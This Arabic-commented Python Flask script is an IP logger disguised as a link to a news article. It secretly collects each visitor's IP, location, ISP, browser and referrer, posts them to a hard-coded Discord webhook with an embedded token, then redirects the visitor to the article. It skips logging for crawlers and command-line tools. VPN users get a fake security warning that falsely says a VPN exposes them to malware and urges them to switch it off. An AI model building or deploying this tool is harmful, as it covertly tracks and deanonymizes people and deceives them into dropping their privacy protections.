from flask import Request, redirect, make_response
import requests
from datetime import datetime

DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1397615981613809776/dO4Lcv7dBOPHDCp4O6BcrE9CbvHjnRWJEqsZ2wQzhxxmyFKvcGTkU7FrHwHCGgqmVhPG"  # <-- ضع رابط Webhook هنا
REDIRECT_URL = "https://jo24.net/article/539190"  # <-- ضع الرابط الذي تريد التوجيه إليه

# قاعدة بيانات مؤقتة داخلية (بديل مبسط عن قاعدة بيانات فعلية)
recent_ips = {}

def is_bot(user_agent: str) -> bool:
    bot_keywords = ["bot", "crawl", "slurp", "spider", "curl", "wget"]
    return any(bot_kw in user_agent.lower() for bot_kw in bot_keywords)

def is_duplicate(ip: str) -> bool:
    now = datetime.utcnow()
    if ip in recent_ips:
        delta = (now - recent_ips[ip]).seconds
        if delta < 60:  # تجاهل خلال دقيقة
            return True
    recent_ips[ip] = now
    return False

def handler(request: Request):
    ip = request.headers.get("x-forwarded-for", request.remote_addr)
    user_agent = request.headers.get("user-agent", "unknown")
    referrer = request.headers.get("referer", "unknown")

    if is_bot(user_agent) or is_duplicate(ip):
        return make_response("تم التعرف على بوت أو زيارة مكررة", 200)

    # الحصول على بيانات الموقع الجغرافي و VPN
    geo_url = f"https://ipapi.co/{ip}/json/"
    try:
        geo_data = requests.get(geo_url).json()
        country = geo_data.get("country_name", "غير معروف")
        country_code = geo_data.get("country_code", "").lower()
        region = geo_data.get("region", "")
        city = geo_data.get("city", "")
        org = geo_data.get("org", "")
        is_vpn = geo_data.get("proxy", False) or geo_data.get("vpn", False)
    except Exception:
        country = "غير معروف"
        city = region = org = ""
        country_code = ""
        is_vpn = False

    # إعداد الوقت
    visit_time = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")

    # إرسال إلى Discord
    embed = {
        "title": "📥 زائر جديد",
        "color": 0x3498db,
        "thumbnail": {"url": f"https://flagcdn.com/w80/{country_code}.png"} if country_code else {},
        "fields": [
            {"name": "🕒 الوقت", "value": visit_time, "inline": False},
            {"name": "🌍 الدولة", "value": f"{country}, {city} ({region})", "inline": True},
            {"name": "🔌 المنظمة", "value": org or "غير معروفة", "inline": True},
            {"name": "🌐 IP", "value": ip, "inline": False},
            {"name": "🖥️ المتصفح", "value": user_agent, "inline": False},
            {"name": "🔗 مصدر الدخول", "value": referrer or "غير معروف", "inline": False},
            {"name": "🛡️ VPN/Proxy", "value": "نعم" if is_vpn else "لا", "inline": True},
        ]
    }

    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]})
    except Exception as e:
        print(f"فشل إرسال إلى Discord: {e}")

    # إذا تم الكشف عن VPN
    if is_vpn:
        html_warning = f"""
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>تحذير أمني</title>
            <style>
                body {{
                    background-color: #1a1a1a;
                    color: #ff4d4f;
                    font-family: Tahoma, sans-serif;
                    text-align: center;
                    padding: 40px;
                }}
                .box {{
                    background-color: #2a2a2a;
                    border: 2px solid #ff4d4f;
                    padding: 30px;
                    border-radius: 10px;
                    display: inline-block;
                }}
            </style>
        </head>
        <body>
            <div class="box">
                <h1>⚠️ تم الكشف عن VPN / Proxy</h1>
                <p>لأسباب أمنية، يرجى <strong>إيقاف الـ VPN</strong> الخاص بك وإعادة المحاولة.</p>
                <p>قد يؤدي استخدام VPN إلى تعريض جهازك لـ <strong>برمجيات خبيثة أو فيروسات</strong>.</p>
                <p>لضمان سلامتك، قم بإيقاف أي أدوات تخفي الهوية الآن.</p>
            </div>
        </body>
        </html>
        """
        return make_response(html_warning, 200)

    return redirect(REDIRECT_URL)
